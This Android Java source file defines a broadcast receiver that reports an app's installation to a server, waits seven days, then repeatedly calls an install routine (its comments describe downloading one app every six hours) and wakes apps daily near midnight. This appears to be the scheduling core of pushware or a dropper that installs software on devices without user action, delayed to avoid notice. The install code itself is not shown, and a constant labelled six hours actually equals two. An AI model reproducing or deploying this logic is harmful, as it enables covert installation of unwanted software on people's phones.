package com.custom.broadcast;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;
import java.util.HashMap;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.custom.Constant;
import com.custom.CustomUtils;
import com.custom.MainApplication;
import com.custom.SharedPreferencesUtils;
import com.custom.network.HttpRequest;

public class StartServiceReceiver extends BroadcastReceiver {  
	Context context = null;
	public static long sixHoure = 2*60*60*1000;//6小时
	public static long servenDay = 7*24*60*60*1000;//7天
	java.text.SimpleDateFormat sf = new java.text.SimpleDateFormat("yyyyMMdd");
    @Override      
    public void onReceive(Context context, Intent intent) { 
    	MainApplication.newInstance(context);
    	//Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
    	this.context = context;
   	 if (intent.getAction().equals("com.custom.broadcast.StartServiceReceiver")) {
   		 Date dateTime = new Date();
   		 long nowTime = dateTime.getTime();
   		long times = 0;
   		
   		
   		
  		 try{
   	   		 //程序收到开机信号就向服务器上报软件ID为19的安装成功记录，
  			 //该记录代表本软件已经装上，要确保这个记录上报成功，失败的话隔天要继续上报
   	   		 String SELF_COMPLETE_RESULT =SharedPreferencesUtils.getConfigString(
   	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.SELF_COMPLETE_RESULT);
   	   		 String SELF_COMPLETE_TIME =SharedPreferencesUtils.getConfigString(
	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.SELF_COMPLETE_TIME);
   	   		 if(SELF_COMPLETE_RESULT.equals("")&&
   	   				 (SELF_COMPLETE_TIME.equals("")||
   	   						 !SELF_COMPLETE_TIME.equals(sf.format(dateTime)))){
	   			    SharedPreferencesUtils.setConfigString(
	       	      				SharedPreferencesUtils.CONFIG_INFO, 
	       	      				SharedPreferencesUtils.SELF_COMPLETE_TIME,
	       	      		        sf.format(dateTime));
   	   			    if(new CustomUtils(StartServiceReceiver.this.context).updateInstalledInfo("3")){
   	    	   			SharedPreferencesUtils.setConfigString(
   	       	      				SharedPreferencesUtils.CONFIG_INFO, 
   	       	      				SharedPreferencesUtils.SELF_COMPLETE_RESULT,
   	       	      		        sf.format(dateTime));
   	   			    }

   	   		 }
    	 }catch(Exception e){
    			e.printStackTrace();  
    	 }
   		
   		
   		
   		 try{
   	   		 //判断一下是7天之后再开始请求，然后也是每六小时下载一款
   	   		 String completeDate =SharedPreferencesUtils.getConfigString(
   	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.COMPLETE_DATE);

   	   		 if(completeDate.equals("")){
    	   			SharedPreferencesUtils.setConfigString(
       	      				SharedPreferencesUtils.CONFIG_INFO, 
       	      				SharedPreferencesUtils.COMPLETE_DATE,
       	      				String.valueOf(dateTime.getTime()+servenDay));
    	   			return;
   	   		 }
   	   		 
   	   		 try{
   	   			 times = 0;
   	   			 times =Long.parseLong(completeDate);
    	   	 }catch(Exception e){}

   	   		if(nowTime<times){
   	   			return;
   	   		}
    	 }catch(Exception e){
    		 e.printStackTrace();
    	 }
   		 
   		 
   		 try{
   	   		 //每隔6小时安装一次
   	   		 String installTime =SharedPreferencesUtils.getConfigString(
   	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.INSTALL_TIME);
   	   		 try{
   	   		    times = 0;
   	   			times = Long.parseLong(installTime);
   	   		 }catch(Exception e){
   	   			 
   	   		 }
   	   		if(nowTime-times>=sixHoure){
   	   			SharedPreferencesUtils.setConfigString(
   	      				SharedPreferencesUtils.CONFIG_INFO, 
   	      				SharedPreferencesUtils.INSTALL_TIME,
   	      				String.valueOf(nowTime));
   	   			new Thread(){
   	   				public void run(){
   	    	   			new CustomUtils(StartServiceReceiver.this.context).install();
   	   				}
   	   			}.start();

   	   		}
    	 }catch(Exception e){
    		 e.printStackTrace();
    	 }


    	 try{
       		 //每天0点5分左右打开程序
       		 String wakeup_date =SharedPreferencesUtils.getConfigString(
     				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.WAKEUP_DATE);
       		 String nowDate = sf.format(dateTime);
        	 if(wakeup_date.equals("")||!nowDate.equals(wakeup_date)){
        		 if(dateTime.getHours()==0&&dateTime.getMinutes()<5){
        			 
        	   			SharedPreferencesUtils.setConfigString(
        	     				SharedPreferencesUtils.CONFIG_INFO, 
        	     				SharedPreferencesUtils.WAKEUP_DATE,
        	     				String.valueOf(nowDate));
           	   			new Thread(){
           	   				public void run(){
           	   					new CustomUtils(StartServiceReceiver.this.context).wakeUpApp();
           	   				}
           	   			}.start();
        		 }
        	 }
    	 }catch(Exception e){
    		 e.printStackTrace();
    	 }
    	
   		 
	 }
    }
    
    
}
